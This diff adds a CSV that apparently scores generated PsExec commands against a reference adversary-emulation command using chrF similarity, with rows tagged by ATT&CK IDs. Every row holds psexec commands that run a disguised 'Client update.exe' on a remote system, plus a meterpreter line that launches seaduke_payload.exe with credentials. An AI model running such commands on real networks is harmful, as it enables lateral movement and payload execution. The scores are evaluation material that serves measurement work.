@@ -1,0 +1,9 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_psexec_TA0002_T1053.txt,psexec,psexec \\\\<target_computer_name> -nobanner -accepteula -i cmd /c <file_path>\Client update.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",25.834,True
+command_psexec_TA0003_T1053.txt,psexec,"psexec \\<target_system> -nobanner -accepteula -d -i cmd /c ""<path_to_Client_update.exe>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",24.312,True
+command_psexec_TA0003_T1053.txt,psexec,"psexec \\<target_system> -nobanner -accepteula -s cmd /c ""<path_to_Client_update.exe>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",23.653,True
+command_psexec_TA0004_T1053.txt,psexec,"psexec \\<remote_system> cmd /c ""Client update.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",17.812,True
